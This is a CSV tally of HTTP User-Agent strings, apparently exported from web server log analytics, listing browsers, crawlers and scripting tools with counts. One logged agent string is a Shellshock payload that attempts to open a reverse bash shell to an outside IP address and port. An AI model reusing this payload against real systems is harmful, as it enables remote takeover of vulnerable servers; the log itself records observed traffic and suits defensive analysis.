"agent.raw: Descending",Count
"""Mozilla/5.0 (Windows NT 6.1; WOW64; rv:12.0) Gecko/20100101 Firefox/12.0""",2
"""Mozilla/5.0 (Windows NT 6.1; WOW64; rv:27.0) Gecko/20100101 Firefox/27.0""",2
"""Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:25.0) Gecko/20100101 Firefox/29.0""",2
"""Mozilla/5.0 (Windows NT 6.3; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/48.0.2564.109 Safari/537.36""",2
"""Mozilla/5.0 (Windows NT 6.3; WOW64; Trident/7.0; rv:11.0) like Gecko""",2
"""Mozilla/5.0 (Windows; U; Windows NT 5.1; en-GB; rv:1.8.1.16) Gecko/20080702 Firefox/2.0.0.16""",2
"""Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US; rv:x.xx) Gecko/20030504 Mozilla Firebird/0.6""",2
"""Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/47.0.2526.73 Safari/537.36""",2
"""Mozilla/5.0 (X11; U; OpenVMS AlphaServer_ES40; en-US; rv:1.4) Gecko/20030826 SWB/V1.4 (HP)""",2
"""Mozilla/5.0 (compatible; Fedora Core 4) FC4 Gnome""",2
"""Mozilla/5.0 (compatible; MSIE 10.0; Windows NT 6.1; Trident/6.0; Touch; MASEJS)""",2
"""Mozilla/5.0 (compatible; MSIE 10.0; Windows NT 6.2; WOW64; Trident/6.0; MATMJS)""",2
"""Mozilla/6.0 (compatible; Amiga-AWeb)""",2
"""Mozilla/6.0 (compatible; MSIE 7.01; Windows 95)""",2
"""Mozilla/6.0 (compatible; MSIE 7.01; Windows CE; 760x412; Samsung)""",2
"""Mozilla/6.0 (compatible; MSIE 7.03; Windows ME) Opera 5.11 [en]""",2
"""Python-urllib/1.17""",2
"""Python-urllib/2.6""",2
"""Scrapy/0.24.4 (+http://scrapy.org)""",2
"""python-requests/2.8.1""",2
"""() { :; }; /bin/bash -i >& /dev/tcp/98.126.212.154/16161 0<&1 2>&1""",1
"""Java/1.7.0_79""",1
"""JetBrains 4.0 Release Candidate 3""",1
"""JetBrains 5.0""",1
"""Mozilla/4.0 (compatible; MSIE 4.01; Windows NT Windows CE)""",1
"""Mozilla/4.0 (compatible; MSIE 5.0; Windows ME) Opera 5.11 [en]""",1
"""Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 6.1; WOW64; Trident/4.0; Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; SV1) ; SLCC2; .NET CLR 2.0.50727; .NET CLR 3.5.30729; .NET CLR 3.0.30729; Media Center PC 6.0; .NET4.0C; .NET4.0E; InfoPath.3)""",1
"""Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 5.1; .NET CLR 2.0.50727; .NET CLR 1.1.4322; .NET CLR 3.0.04506.30; .NET CLR 3.0.04506.648)""",1
"""Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.1; Trident/4.0; SLCC2; .NET CLR 2.0.50727; .NET CLR 3.5.30729; .NET CLR 3.0.30729)""",1
"""Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.1; WOW64; Trident/4.0; SLCC2; .NET CLR 2.0.50727; .NET CLR 3.5.30729; .NET CLR 3.0.30729; Media Center PC 6.0)""",1
"""Mozilla/5.0 (Macintosh; U; PPC Mac OS X; en) AppleWebKit/51 (like Gecko) Safari/51""",1
"""Mozilla/5.0 (Windows NT 6.1; rv:38.0) Gecko/20100101 Firefox/38.0""",1
"""Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US) AppleWebKit/534.7 (KHTML, like Gecko) Chrome/7.0.514.0 Safari/534.7""",1
"""Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US; rv:1.8.0.7) Gecko/20060909 Firefox/1.5.0.7""",1
"""Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US; rv:x.xx) Gecko/20090504 Mozilla Firefox/3.0.2.1""",1
"""Mozilla/5.0 (Windows; U; Windows NT 5.1; rv:1.7.3) Gecko/20041001 Firefox/0.10.1""",1
"""Mozilla/5.0 (Windows; U; Windows NT 6.0; en-US; rv:1.9.2.3) Gecko/20100401 Firefox/3.6.3 GTB6 (.NET CLR 3.5.30729)""",1
"""Mozilla/5.0 (Windows; U; Windows NT 6.1; en-US; rv:1.9.1.5) Gecko/20091102 Firefox/3.5.5 (.NET CLR 3.5.30729)""",1
"""Mozilla/5.0 (X11; Linux x86_64; rv:28.0) Gecko/20100101 Firefox/28.0""",1
"""Mozilla/5.0 (compatible, MSIE 11, Windows NT 6.3; Trident/7.0; rv:11.0) like Gecko""",1
"""Mozilla/5.0 (compatible; AOL-IDSol 4.1.1 Fedora Core 3) FC3 KDE""",1
"""Mozilla/5.0 (compatible; Fedora Core 4) FC4 KDE""",1
"""Mozilla/5.0 (compatible; Fedora Core 5) FC5 Gnome""",1
"""Mozilla/5.0 (compatible; Fedora Core 5) FC5 KDE""",1
"""Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)""",1
"""Mozilla/5.0 (compatible; MSIE 10.0; Windows NT 6.1; WOW64; Trident/6.0)""",1
"""Mozilla/5.0 (compatible; Uptimebot/1.0; +http://www.uptime.com/uptimebot)""",1
"""Mozilla/5.0 (compatible; Yahoo! Slurp; http://help.yahoo.com/help/us/ysearch/slurp)""",1
"""Mozilla/5.0 (compatible; YandexBot/3.0; +http://yandex.com/bots)""",1
"""Mozilla/5.0 (compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm)""",1
"""Mozilla/6.0 (compatible; MSIE 7.01; AOL 9.0; Windows 98)""",1
"""Mozilla/6.0 (compatible; MSIE 7.01; Amiga-AWeb)""",1
"""Mozilla/6.0 (compatible; MSIE 7.01; Windows NT Windows CE)""",1
"""Mozilla/6.0 (compatible; MSIE 7.01; Windows NT)""",1
"""Mozilla/6.0 (compatible; MSIE 7.03; Windows ME) Opera 5.19 [jp]""",1
"""Ruby""",1
"""Wget/1.15 (linux-gnu)""",1
"""Wget/1.16.1 (linux-gnu)""",1
"""curl/7.19.7 (x86_64-redhat-linux-gnu) libcurl/7.19.7 NSS/3.13.1.0 zlib/1.2.3 libidn/1.18 libssh2/1.2.2""",1
"""curl/7.21.0 (i486-pc-linux-gnu) libcurl/7.21.0 OpenSSL/0.9.8o zlib/1.2.3.4 libidn/1.15 libssh2/1.2.6""",1
